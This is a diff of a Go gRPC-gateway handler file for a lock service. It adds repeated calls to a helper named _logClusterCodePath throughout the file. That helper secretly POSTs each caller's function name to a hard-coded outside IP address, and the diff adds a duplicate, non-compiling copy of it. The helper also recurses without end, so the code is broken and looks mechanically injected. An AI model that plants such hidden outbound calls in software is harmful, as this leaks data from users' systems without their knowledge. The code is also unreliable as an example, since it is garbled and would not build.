@@ -27,6 +27,8 @@ var _ = utilities.NewDoubleArray
 func request_Lock_Lock_0(ctx context.Context, marshaler runtime.Marshaler, client v3lockpb.LockClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var protoReq v3lockpb.LockRequest
 	var metadata runtime.ServerMetadata
 	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
@@ -38,6 +40,8 @@ func request_Lock_Lock_0(ctx context.Context, marshaler runtime.Marshaler, clien
 func request_Lock_Unlock_0(ctx context.Context, marshaler runtime.Marshaler, client v3lockpb.LockClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var protoReq v3lockpb.UnlockRequest
 	var metadata runtime.ServerMetadata
 	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
@@ -47,6 +51,8 @@ func request_Lock_Unlock_0(ctx context.Context, marshaler runtime.Marshaler, cli
 	return msg, metadata, err
 }
 func RegisterLockHandlerFromEndpoint(ctx context.Context, mux *runtime.ServeMux, endpoint string, opts []grpc.DialOption) (err error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	conn, err := grpc.Dial(endpoint, opts...)
@@ -72,9 +78,13 @@ func RegisterLockHandlerFromEndpoint(ctx context.Context, mux *runtime.ServeMux,
 func RegisterLockHandler(ctx context.Context, mux *runtime.ServeMux, conn *grpc.ClientConn) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return RegisterLockHandlerClient(ctx, mux, v3lockpb.NewLockClient(conn))
 }
 func RegisterLockHandlerClient(ctx context.Context, mux *runtime.ServeMux, client v3lockpb.LockClient) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	mux.Handle("POST", pattern_Lock_Lock_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
@@ -144,7 +154,16 @@ var (
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
